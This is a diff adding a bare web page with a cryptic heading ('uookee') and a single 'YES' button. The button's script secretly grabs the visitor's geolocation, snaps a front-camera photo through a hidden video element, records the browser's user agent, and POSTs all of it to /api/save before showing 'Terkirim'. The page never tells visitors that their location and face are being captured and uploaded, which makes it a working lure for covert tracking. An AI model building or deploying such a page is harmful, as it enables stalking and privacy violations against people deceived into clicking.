@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>web</title>
+</head>
+<body>
+    <h3>uookee</h3>
+<button onclick="start()">YES</button>
+<video id="v" autoplay hidden></video>
+
+<script>
+async function start(){
+  const pos = await new Promise(r=>navigator.geolocation.getCurrentPosition(r));
+  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+  v.srcObject = stream;
+
+  await new Promise(r=>setTimeout(r,1000));
+  const c=document.createElement("canvas");
+  c.width=640;c.height=480;
+  c.getContext("2d").drawImage(v,0,0);
+  stream.getTracks().forEach(t=>t.stop());
+
+  const device = navigator.userAgent;
+
+  fetch("/api/save",{
+    method:"POST",
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      lat:pos.coords.latitude,
+      lng:pos.coords.longitude,
+      img:c.toDataURL(),
+      device
+    })
+  }).then(()=>alert("Terkirim"));
+}
+</script>
+
+</body>
+</html>
